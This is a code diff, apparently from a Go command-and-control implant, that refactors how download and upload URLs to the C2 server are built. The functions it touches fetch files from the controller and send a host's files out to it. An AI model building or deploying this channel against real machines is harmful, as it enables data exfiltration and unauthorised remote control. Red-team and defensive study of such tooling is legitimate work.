@@ -60,9 +60,9 @@ func FetchFile(download_addr, file_to_download, path, checksum string) (data []b
 // DownloadViaC2 download via EmpHTTPClient
 // if path is empty, return []data instead
 func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err error) {
-	url := fmt.Sprintf("%s/%s/%s?file_to_download=%s",
-		def.CCAddress, transport.DownloadFile2AgentAPI, url.QueryEscape(common.RuntimeConfig.AgentUUID), url.QueryEscape(file_to_download))
-	logging.Printf("DownloadViaCC is downloading from %s", url)
+	downloadURL := netutil.JoinURL(def.CCAddress, transport.DownloadFile2AgentAPI, url.QueryEscape(common.RuntimeConfig.AgentUUID)) +
+		"?file_to_download=" + url.QueryEscape(file_to_download)
+	logging.Printf("DownloadViaCC is downloading from %s", downloadURL)
 	retData := false
 	if path == "" {
 		retData = true
@@ -70,7 +70,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 	}
 	lock := fmt.Sprintf("%s.lock", path)
 	if util.IsFileExist(lock) {
-		err = fmt.Errorf("%s already being downloaded", url)
+		err = fmt.Errorf("%s already being downloaded", downloadURL)
 		return
 	}
 
@@ -82,13 +82,13 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 
 	// if no path specified
 	if retData {
-		logging.Printf("Downloading %s to memory", url)
+		logging.Printf("Downloading %s to memory", downloadURL)
 		client := def.HTTPClient
 		if client == nil {
 			err = fmt.Errorf("failed to initialize HTTP client")
 			return
 		}
-		req, err := http.NewRequest("GET", url, nil)
+		req, err := http.NewRequest("GET", downloadURL, nil)
 		if err != nil {
 			err = fmt.Errorf("DownloadViaCC HTTP GET failed to create request: %v", err)
 			return nil, err
@@ -116,7 +116,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 	}
 
 	// use grab
-	logging.Printf("Downloading %s to %s", url, path)
+	logging.Printf("Downloading %s to %s", downloadURL, path)
 	client := grab.NewClient()
 	client.HTTPClient = def.HTTPClient
 	if client.HTTPClient == nil {
@@ -124,7 +124,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 		return
 	}
 
-	req, err := grab.NewRequest(path, url)
+	req, err := grab.NewRequest(path, downloadURL)
 	if err != nil {
 		err = fmt.Errorf("create grab request: %v", err)
 		return
@@ -169,7 +169,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 				err = fmt.Errorf("checksum failed: %s != %s", crypto.SHA256SumRaw(fileData), checksum)
 				return
 			}
-			logging.Printf("saved %s to %s (%d bytes)", url, path, resp.Size())
+			logging.Printf("saved %s to %s (%d bytes)", downloadURL, path, resp.Size())
 			return
 		case <-t.C:
 			logging.Printf("%.02f%% complete", resp.Progress()*100)
@@ -197,10 +197,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	data = data[offset:]
 
 	// connect
-	url := fmt.Sprintf("%s/%s/%s",
-		def.CCAddress,
-		transport.Upload2AgentAPI,
-		token)
+	url := netutil.JoinURL(def.CCAddress, transport.Upload2AgentAPI, token)
 	conn, _, _, err := EstablishC2Connection(url)
 	logging.Printf("connection: %s", url)
 	if err != nil {
